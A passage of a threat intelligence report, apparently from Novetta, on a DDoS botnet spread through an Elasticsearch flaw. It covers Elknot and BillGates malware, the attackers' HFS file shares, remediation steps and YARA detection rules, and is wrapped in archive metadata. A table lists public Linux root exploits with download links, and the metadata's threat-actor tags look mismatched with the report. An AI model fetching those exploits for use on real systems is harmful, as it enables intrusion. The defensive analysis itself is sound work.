jessica_biel_naked_\nin_my_bed.c\n\n\n[http://sebug.net/](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\n[paper/linux_ex-](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\n[p/2.6.17-2.6.24.1/2.6.17.c](http://sebug.net/paper/linux_exp/2.6.17-2.6.24.1/2.6.17.c)\n\n\nAA2.c “Linux kernel-2.6.18-6 x86 Local Root exploit.c [http://1337day.com/ex-](http://1337day.com/exploit/17158)\nExploit” [ploit/17158](http://1337day.com/exploit/17158)\n\nAA3.c “Linux Kernel <= 2.6.37 local privi- full-nelson.c [http://vulnfactory.org/](http://vulnfactory.org/exploits/full-nelson.c)\nlege escalation by Dan Rosenberg” [exploits/full-nelson.c](http://vulnfactory.org/exploits/full-nelson.c)\n\n\n-----\n\nWhile the Elknot malware does not have direct file management or process management\nfunctionality, it would still be possible for the attackers responsible for the C2 servers that house\nthe local privilege exploits to introduce these binaries on a victim’s machine using the exact same\nElasticsearch vulnerability that led to the initial infection. However, for those using the BillGates\nmalware, it would be a simple matter to download, decompress and execute the exploit packages\nthanks to the malware’s remote shell functionality.\n\nThe use of such old exploits, the automated manner by which the Elasticsearch exploitation was\nperformed, and the lack of observed lateral movement indicates that the actors involved with the\nconstruction of the DDoS botnet have little real interest in data theft, but rather resource theft.\nMoreover, the actors appear to have little more than “script-kiddie” skill levels as the tools being\nused by the actors are easily acquired and meant to be deployed practically off the shelf, requiring\nalmost no customization for a victim’s machine. Regardless of the actors’ skill level, the fact that the\nElasticsearch vulnerability is so easily exploited means that very little skill is necessary to develop a\nlarge-scale DDoS infrastructure.\n\nThe lack of operational technical skill is also mirrored in the lack of operational security demonstrated\nby the actors, which has been highlighted previously in MMD’s analyses of this malware. As Novetta\nobserved with Delilah, the use of HFS instances provides a fast means for sharing content, but it\nalso reveals information such as the number of times a particular file has been downloaded, which\nin turn reveals how pervasive a particular actor is. It was also not uncommon to find additional, nonattack related files within the HFS instance. For example, one particular actor routinely shared out\nwhat appeared to be a Legends of Mir game server. Additionally, one of the HFS instances frequently\nwould share out text files containing brute force password dictionaries, lists of Elasticsearch instances\nthat have been compromised, and a list of server IP addresses with their respective usernames and\npasswords. By crawling the various open HFS instances seen by the Delilah attack alerts, Novetta\nwas able to capture roughly 70 files in addition to the 48 files found within the Elasticsearch attacks.\nCollectively, the nearly 120 files provide a wealth of information on the attacker’s motivations, tools,\nand practices.\n\n8. DETECTION/REMEDIATION STRATEGIES\nClearly the first remediation activity that an administrator should perform is to apply the necessary\npatches to their Elasticsearch instances on a continual basis. While this will not remediate existing\ninfections, it will prevent an uninfected instance from succumbing to the current threat. Along these\nsame lines, it would be advisable for any Elasticsearch instance that does not need direct access by\nany individual on the Internet to have a firewall in place to prevent such access.\n\nRemoval of the Elknot malware is a simple matter of rebooting the victim server. There is no\npersistence included within Elknot, therefore merely rebooting the server will flush the infection. This\nbeing said, a forensic analysis of the victim server should be performed as other malware, unrelated\nto Elknot, may have been introduced via the Elasticsearch vulnerability.\n\nAdministrators can use the following two YARA signatures to detect the presence of the Elknot\npayload and its dropper on an infected host:\n\n\n-----\n\nrule Elknot_dropper\n{\nmeta:\nauthor = “Novetta Advanced Research Group”\ndescription = “Detection of the Elknot dropper related to the Elasticsearch\nvulnerability attacks after UPX is removed”\nstrings:\n$ = { 2F 70 72 6F 63 2F 73 65 6C 66 2F 65 78 65 00 63\n70 20 25 73 20 25 73 00 25 73 20 25 73 20 31 00\n63 70 20 25 73 20 25 73 61 00 }\n\ncondition:\nall of them\n}\n\nrule Elknot_malware\n{\nmeta:\nauthor = “Novetta Advanced Research Group”\ndescription = “Detection of the Elknot malware related to the Elasticsearch\nvulnerability attacks”\nstrings:\n$ = “13CThreadAttack”\n$ = “%7s %llu %lu %lu %lu %lu %lu %lu %lu %llu %lu %lu %lu %lu %lu %lu”\n$ = “fake.cfg”\n$ = “[ %02d.%02d %02d:%02d:%02d.%03ld ] [%lu] [%s] %s”\ncondition:\nall of them\n}\n\nRemoval of the BIllGates malware is more problematic than the removal of the Elknot malware.\nThe BillGates malware does introduce persistence by means of establishing not only a service\nwithin the /etc/rc.d directories, but also by installing a startup command in the /etc/rc.local\nfile during the initial infection phase. It is advisable to reimage any server compromised with\nBillGates in order to ensure that the infection is completely removed. Otherwise, administrators\nshould take due diligence in looking for new files introduced into the /usr/bin directory as well\nas new services introduced in the various /etc/rc.d directories. The following YARA signatures\ncan help locate BillGates malware.\n\nrule BillGates\n{\nmeta:\nauthor = “Novetta Advanced Research Group”\ndescription = “Detection of the BillGates malware”\nstrings:\n$ = “CThreadClientStatus”\n$ = “CLoopCmd”\n$ = “/tmp/gates.lock”\ncondition:\nall of them\n}\n\n\n-----\n\nOne common indicator of a BillGates infection is the existence of /tmp/moni.lock as well as\n/tmp/bill.lock files on the victim’s machine. Additionally, directories off the /usr/bin directory\ncontaining the name bsd-port may be suspect.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "http://www.novetta.com/wp-content/uploads/2015/06/NTRG_ElasticBotnetReport_06102015.pdf"
    ],
    "report_names": [
        "NTRG_ElasticBotnetReport_06102015.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1433947515,
    "ts_modification_date": 1433947527,
    "files": {
        "pdf": "https://archive.orkl.eu/cefdd47d485ab9e5e9550849f6b92f706a8bce72.pdf",
        "text": "https://archive.orkl.eu/cefdd47d485ab9e5e9550849f6b92f706a8bce72.txt",
        "img": "https://archive.orkl.eu/cefdd47d485ab9e5e9550849f6b92f706a8bce72.jpg"
    }
}